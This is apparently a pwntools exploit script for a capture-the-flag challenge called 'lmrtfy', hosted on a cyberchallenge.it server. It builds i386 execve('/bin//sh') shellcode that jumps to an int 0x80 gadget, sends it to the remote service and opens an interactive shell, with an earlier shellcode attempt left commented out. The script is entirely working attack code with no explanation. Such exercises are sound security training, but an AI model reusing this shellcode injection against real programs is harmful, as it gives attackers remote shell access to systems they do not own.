from pwn import *

context.log_level = 'debug'
context.arch = 'i386'
context.binary = e = ELF('./lmrtfy')

# Find int 0x80 gadget (if not at 0x08049444)
int80_gadget = 0x08049444  # Replace with actual address if different
#
# shell = asm('''
#     mov eax, 0x68732f2f
#     push eax
#     mov eax, 0x6e69622f
#     push eax
#     mov ebx, 0x00000000
#     push ebx
#     call {}
# '''.format(hex(int80_gadget)))

shell = asm(f'''
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx
    push 0x0b
    pop eax
    push ebx
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    mov esi, {int80_gadget}
    jmp esi
''')


# p = process('./lmrtfy')
p = remote('lmrtfy.challs.cyberchallenge.it', 9124)

# gdb.attach(p, '''
#     b *0x0804943d
#     continue
# ''')

p.sendline(shell)
p.interactive()
